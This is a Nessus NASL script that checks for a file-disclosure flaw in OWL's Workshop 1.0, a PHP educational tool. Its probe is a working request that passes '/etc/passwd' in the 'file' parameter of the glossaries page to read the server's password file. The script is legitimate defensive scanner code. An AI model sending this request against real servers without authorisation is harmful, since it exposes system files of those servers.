#
# This script was written by Noam Rathaus
#
# GPLv2
#
# From: <zetalabs@zone-h.org>
# Subject: ZH2004-08SA (security advisory): OWLS 1.0 Remote arbitrary files retrieving
# Date: Wed Feb 18 11:13:39 2004
#

if(description)
{
  script_id(12079);
  script_cve_id("CAN-2004-0302", "CAN-2004-0303");
  script_bugtraq_id(9689);
  script_version("$Revision: 1.4 $");
  name["english"] = "File Disclosure in OWL's Workshop";
  script_name(english:name["english"]);
 
  desc["english"] = "
OWL's workshop is a web-based educational tool written in PHP.

There is a vulnerability in the current version of this software which 
allows an attacker to retrieve arbitrary files from the webserver with its 
priviledges.

Solution : None at this time - disable this software.
Risk factor : High";

  script_description(english:desc["english"]);
 
  summary["english"] = "Detect OWLS File Disclosure";
  script_summary(english:summary["english"]);
 
  script_category(ACT_GATHER_INFO);
 
  script_copyright(english:"This script is Copyright (C) 2004 Noam Rathaus");

  family["english"] = "CGI abuses";
  script_family(english:family["english"]);
  script_dependencie("find_service.nes", "http_version.nasl");
  script_require_ports("Services/www", 80);
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if (! get_port_state(port) ) exit(0);
if (! can_host_php(port:port) )exit(0);


function check_dir(path)
{
 req = http_get(item:string(path, "/owls/glossaries/index.php?file=/etc/passwd"), port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 if (egrep(pattern:".*root:.*:0:[01]:.*", string:res))
 {
  security_hole(port);
  exit(0);
 }
}

foreach dir ( cgi_dirs() )
{
 check_dir(path:dir);
}
